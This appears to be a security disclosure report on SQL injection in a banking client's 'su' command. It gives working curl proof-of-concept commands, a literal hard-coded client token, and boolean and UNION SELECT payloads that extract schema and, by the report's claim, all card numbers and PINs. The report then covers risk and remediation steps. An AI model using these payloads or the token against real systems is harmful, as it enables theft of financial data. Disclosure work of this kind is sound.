# Description

SQL injection (CWE-89) in the internal banking client's `su` command. The backend builds a SQLite query by concatenating the `payment_number` argument directly into SQL:

```sql
SELECT id, payment_number, pin, attempts, balance FROM user WHERE payment_number = <input>
```

The command is reachable through the public UUID-namespaced banking client path after opening an API session with the **hard-coded** client token — no web session or bank PIN required. Boolean and `UNION SELECT` payloads execute, and attacker-controlled SQL results are reflected in the JSON response fields.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Open a session with the hard-coded token. | Receive a `sid`. |
| 2 | Call `su` with no argument. | Error discloses the raw query. |
| 3 | Inject via `command+su+payment_number+<payload>`. | Boolean / UNION injection executes. |

# PoC

```bash
TOKEN='Q5HxkocADCyPG39FBrqLvN6rtu3nSBxP'
BASE='https://<TARGET>/banking/a0faaa38-c51f-428a-bd85-54deb308ac86'
SID=$(curl -sk "$BASE/none&none&$TOKEN" | python3 -c "import json,sys;print(json.load(sys.stdin)['sid'])")
```

**Error-based query disclosure:**

```json
{"success": false, "error": "(sqlite3.OperationalError) incomplete input
[SQL: SELECT id, payment_number, pin, attempts, balance FROM user WHERE payment_number = ]"}
```

**Boolean injection** — `payment_number=1 OR 1=1--` returns the first user record.

**UNION SELECT — arbitrary column control & schema extraction:**

```bash
curl -sk "$BASE/command+su+payment_number+1%20UNION%20SELECT%201,sqlite_version(),3,4,5--&$SID&$TOKEN"
# {"user":{"payment_number":"3.46.1", ...}}

curl -sk "$BASE/command+su+payment_number+1%20UNION%20SELECT%201,group_concat(name),3,4,5%20FROM%20sqlite_master%20WHERE%20type='table'--&$SID&$TOKEN"
# {"user":{"payment_number":"user,card", ...}}
```

Confirmed extraction of all card numbers, PINs, balances; `user`=20 rows, `card`=26 rows.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Full read of the banking database: card numbers, payment numbers, PINs, balances, schema. |
| Integrity | PINs are stored in the same DB and treated as authorization material — this defeats the PIN control. |
| Availability | None confirmed (stacked-write not tested). |

Overall severity: **High** — no web session or PIN required; an independent path to the entire banking dataset even if helper commands were removed.

# Remediation

1. **Use parameterised queries / ORM** in the `su` command; never concatenate `payment_number` into SQL.
2. **Strictly type-validate** `payment_number` before query construction.
3. **Disable detailed SQL errors** in API responses.
4. **Remove the hard-coded shared token**; require authenticated, network-restricted callers and rotate the secret.

# Author
TéléHack
